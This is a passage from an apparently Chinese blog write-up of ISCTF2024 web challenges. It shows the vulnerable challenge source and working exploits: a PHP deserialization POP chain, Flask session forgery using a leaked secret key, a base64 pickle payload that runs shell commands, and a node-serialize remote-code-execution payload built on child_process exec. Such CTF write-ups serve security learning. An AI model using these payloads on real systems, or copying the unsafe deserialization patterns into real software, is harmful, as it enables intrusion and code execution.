class="hljs-variable">$ren</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;迷途中的羔羊，你相信天命吗？&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;tianming;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Wukong&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;开局一根棍，装备全靠打。&#x27;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>序列化poc</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">Tianmingren<span class="hljs-punctuation">#</span><span class="hljs-keyword">__destruct</span><span class="hljs-params">()</span>==&gt;Dinghaishenzhen<span class="hljs-punctuation">#</span><span class="hljs-keyword">__toString</span><span class="hljs-params">()</span>==&gt;Huoyanjinjing<span class="hljs-punctuation">#</span><span class="hljs-keyword">__invoke</span><span class="hljs-params">()</span>==&gt;Wuzhishan<span class="hljs-punctuation">#</span><span class="hljs-keyword">__get</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure><p>序列化exp</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs leaf">&lt;?php<br><br>class Tianmingren &#123;<br>    public $tianming;<br>&#125;<br><br>class Dinghaishenzhen &#123;<br>    public $yun;<br>&#125;<br><br>class Huoyanjinjing &#123;<br>    public $huoyan;<br>&#125;<br><br>class Wuzhishan&#123;<br>    <br>&#125;<br><br>$a = new Tianmingren();<br>$a-&gt;tianming = new Dinghaishenzhen();<br>$a-&gt;tianming-&gt;yun = new Huoyanjinjing();<br>$a-&gt;tianming-&gt;yun-&gt;huoyan = new Wuzhishan();<br><br>echo serialize($a);<br><br>// Tianmingren<span class="hljs-punctuation">#</span><span class="hljs-keyword">__destruct</span><span class="hljs-params">()</span>==&gt;Dinghaishenzhen<span class="hljs-punctuation">#</span><span class="hljs-keyword">__toString</span><span class="hljs-params">()</span>==&gt;Huoyanjinjing<span class="hljs-punctuation">#</span><span class="hljs-keyword">__invoke</span><span class="hljs-params">()</span>==&gt;Wuzhishan<span class="hljs-punctuation">#</span><span class="hljs-keyword">__get</span><span class="hljs-params">()</span><br><br>?&gt;<br></code></pre></td></tr></table></figure><p>绕过__get()方法中的判断只要找一个0e开头的字符串且其md5值仍为0e开头即可</p><p>源码中的“throw new Exception(‘开局一根棍，装备全靠打。’);”会抛出一个异常，直接中断脚本执行，去破坏反序列化结构，这里通过将下图中选中出的0修改为2，达到破坏反序列化结构的目的</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/tianming.png"></p><h2 id="新闻系统"><a href="#新闻系统" class="headerlink" title="新闻系统"></a>新闻系统</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = <span class="hljs-string">&quot;W3l1com_isCTF&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">News</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, title, content</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.title = title<br>        <span class="hljs-variable language_">self</span>.content = content<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;news(name=<span class="hljs-subst">&#123;self.title&#125;</span>, words=<span class="hljs-subst">&#123;self.content&#125;</span>)&quot;</span><br>    <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NewsList</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.news_list = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_news</span>(<span class="hljs-params">self, title, content</span>) -&gt; <span class="hljs-literal">None</span>:<br>        news = News(title,content)<br>        <span class="hljs-variable language_">self</span>.news_list.append(news)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">export_news</span>(<span class="hljs-params">self, news_title</span>) -&gt; <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span>:<br>        news = <span class="hljs-variable language_">self</span>.get_news(news_title)<br>        <span class="hljs-keyword">if</span> news <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-variable language_">self</span>.news_list.remove(news)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;删除成功&#x27;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_news</span>(<span class="hljs-params">self, serialized_news</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">try</span>:<br>            news_data = base64.b64decode(serialized_news)<br>            black_list = [<span class="hljs-string">&#x27;create_news&#x27;</span>,<span class="hljs-string">&#x27;export_news&#x27;</span>,<span class="hljs-string">&#x27;add_news&#x27;</span>,<span class="hljs-string">&#x27;get_news&#x27;</span>]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> black_list:<br>                <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(news_data):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            news = pickle.loads(news_data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(news,News):<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.news_list:<br>                    <span class="hljs-keyword">if</span> i.title == news.title:<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>                <span class="hljs-variable language_">self</span>.news_list.append(news)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">except</span> Exception:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_news</span>(<span class="hljs-params">self, news_title</span>) -&gt; News | <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">for</span> news <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.news_list:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(news.title) == news_title:<br>                <span class="hljs-keyword">return</span> news<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br>newslist = NewsList()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">and</span> password == <span class="hljs-string">&#x27;test111&#x27;</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>            session[<span class="hljs-string">&#x27;password&#x27;</span>] = password<br>            session[<span class="hljs-string">&#x27;status&#x27;</span>] = <span class="hljs-string">&#x27;user&#x27;</span><br>            <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/news&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;login_error&#x27;</span>] = <span class="hljs-literal">True</span>               <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/news&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">news</span>():<br>    news = newslist.news_list<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;news.html&quot;</span>,news = news)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;status&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;password&#x27;</span>) != <span class="hljs-string">&#x27;admin222&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br>    news = newslist.news_list<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;admin.html&quot;</span>,news = news)<br>    <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/create&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_news</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;status&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;password&#x27;</span>) != <span class="hljs-string">&#x27;admin222&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)   <br>    title = request.form.get(<span class="hljs-string">&#x27;title&#x27;</span>)<br>    content = request.form.get(<span class="hljs-string">&#x27;content&#x27;</span>)<br>    newslist.create_news(title,content)<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/admin&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/export&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">export_news</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;status&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;password&#x27;</span>) != <span class="hljs-string">&#x27;admin222&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br>    news_title = request.form[<span class="hljs-string">&quot;title&quot;</span>]<br>    result = newslist.export_news(news_title)<br>    <span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;result&quot;</span>: result&#125;)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;news not found&quot;</span>&#125;)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/add&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_news</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;status&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;password&#x27;</span>) != <span class="hljs-string">&#x27;admin222&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)    <br>    serialized_news = request.form[<span class="hljs-string">&quot;serialized_news&quot;</span>]<br>    <span class="hljs-keyword">if</span> newslist.add_news(serialized_news):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/admin&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to add news&quot;</span>&#125;)<br><br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8888</span>, debug=<span class="hljs-literal">False</span>, threaded=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>源码中给出了SECRET_KEY可以进行seesion伪造，伪造管理员身份，NewList类中的add_news()方法进行了反序列化并添加一条新闻（通过&#x2F;add路由，提交base64编码的pickle数据打python反序列化）</p><p>先进行session伪造</p><blockquote><p>python flask_session_cookie_manager3.py decode -c “.eJyrVsrJT8_Mi08tKsovUrIqKSpN1VEqSCwuLs8vSlGyUipJLS4xNDRU0lEqLkksKS0GCpUWpxYB-SAqLzE3FapIqRYA7_MZ7A.aDRjvg.R4AEzHRJE7VSrm4qh3aemwSLHho” -s “W3l1com_isCTF”</p><p>python flask_session_cookie_manager3.py encode -t “{‘login_error’: True, ‘password’: ‘admin222’, ‘status’: ‘admin’, ‘username’: ‘admin’}” -s “W3l1com_isCTF”</p></blockquote><p>替换伪造的session后访问&#x2F;admin路由</p><p>打python反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>payload = <span class="hljs-string">b&quot;&quot;&quot;cbuiltins</span><br><span class="hljs-string">eval</span><br><span class="hljs-string">(S&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].app.before_request_funcs.setdefault(None,[]).append(lambda:__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;</span><br><span class="hljs-string">tR.&quot;&quot;&quot;</span><br><span class="hljs-built_in">print</span>(base64.b64encode(payload).decode())<br><br><span class="hljs-comment">#Y2J1aWx0aW5zCmV2YWwKKFMiX19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5hcHAuYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLFtdKS5hcHBlbmQobGFtYmRhOl9faW1wb3J0X18oJ29zJykucG9wZW4oJ2NhdCAvZmxhZycpLnJlYWQoKSkiCnRSLg==</span><br></code></pre></td></tr></table></figure><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">var</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">var</span> serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;node-serialize&#x27;</span>);<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>())<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, <span class="hljs-string">&#x27;./views&#x27;</span>);<br><br>users=&#123;<span class="hljs-string">&quot;guest&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">auth</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>)&#123;<br>    <span class="hljs-keyword">const</span> user = serialize.<span class="hljs-title function_">unserialize</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>,<span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toString</span>());<br>    <span class="hljs-keyword">if</span> (!user.<span class="hljs-property">username</span>) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>);<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>);<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/index&#x27;</span>,auth,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)&#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;index&quot;</span>);<br>&#125;);<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/register&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)&#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;register&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/register&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)&#123;<br>    username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br>    password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br><br>    <span class="hljs-keyword">if</span> (!username || !password) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;用户名和密码都是必填项&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (users[username]) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">409</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;用户名已存在&#x27;</span>);<br>    &#125;<br>    users[username] = password;  <br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">201</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;用户注册成功&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)&#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;login&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)&#123;<br>  username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br>  password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br>  <span class="hljs-keyword">if</span> (!username || !password) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;用户名和密码都是必填项&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!(users[username])) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">409</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;用户名不存在&#x27;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(users[username] === password)&#123;<br>      token=<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(serialize.<span class="hljs-title function_">serialize</span>(&#123;<span class="hljs-string">&#x27;username&#x27;</span>:username,<span class="hljs-string">&#x27;isAdmin&#x27;</span>:<span class="hljs-literal">false</span>&#125;)).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;base64&#x27;</span>)<br>      res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;token&#x27;</span>,token, &#123;<br>        <span class="hljs-attr">maxAge</span>: <span class="hljs-number">900000</span>,<br>        <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span><br>      &#125;);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/index&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;密码错误&#x27;</span>);<br>    &#125;<br>  &#125;<br><br>&#125;);<br><br><span class="hljs-comment">// 启动服务器</span><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">80</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server running at http://localhost:80`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>cookie处有反序列化，且node_serialize的0.0.4版本存在命令执行漏洞（<a href="https://xz.aliyun.com/news/6780%EF%BC%89">https://xz.aliyun.com/news/6780）</a></p><p>payload</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">&#123;<span class="hljs-string">&quot;rce&quot;</span>:<span class="hljs-string">&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;</span>child_process&#x27;).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;cat /flag&gt;./views/login.ejs&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(error, stdout, stderr)</span>&#123;<span class="hljs-title">console</span>.<span class="hljs-title">log</span><span class="hljs-params">(stdout)</span>&#125;);&#125;<span class="hljs-params">()</span>&quot;&#125;</span><br></code></pre></td></tr></table></figure><p>base64编码后，替换cookie，刷新登录页面得到flag</p><h2 id="ezejs"><a href="#ezejs" class="headerlink" title="ezejs"></a>ezejs</h2><h2 id="小蓝鲨的冒险"><a href="#小蓝鲨的冒险" class="headerlink" title="小蓝鲨的冒险"></a>小蓝鲨的冒险</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 